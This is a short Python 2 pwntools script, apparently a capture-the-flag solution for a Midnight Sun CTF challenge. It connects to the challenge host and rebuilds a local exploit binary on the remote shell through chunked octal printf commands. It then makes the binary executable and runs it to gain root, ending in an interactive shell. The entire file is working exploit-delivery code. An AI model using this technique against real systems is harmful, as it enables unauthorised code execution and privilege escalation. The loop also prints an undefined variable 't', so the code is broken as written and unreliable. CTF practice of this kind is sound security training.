#!/usr/bin/env python
from pwn import *
import base64 , os , re

host , port = 'hfsipc-01.play.midnightsunctf.se' , 8192
y = remote( host , port )


def sp( cmd ):
    y.sendlineafter( '$' , cmd )

e = open( './pwn' ).read()
e = e.ljust( ((len(e)/0xf0) + 1) * 0xf0 , '\0' )
print len( e ) / 0xf0


sp( 'touch ./pwn' )

info( 'Uploading binary...' )
for i in re.findall( '.' * 0xf0 , e , re.DOTALL ):
    print t
    sp( 'printf \'\\%s\' >> ./pwn' % '\\'.join( oct( ord( _ ) )[1:].rjust( 3 ,'0' ) for _ in i ) )


sp( 'chmod +x ./pwn' )

sp( './pwn' ) # root !


y.interactive()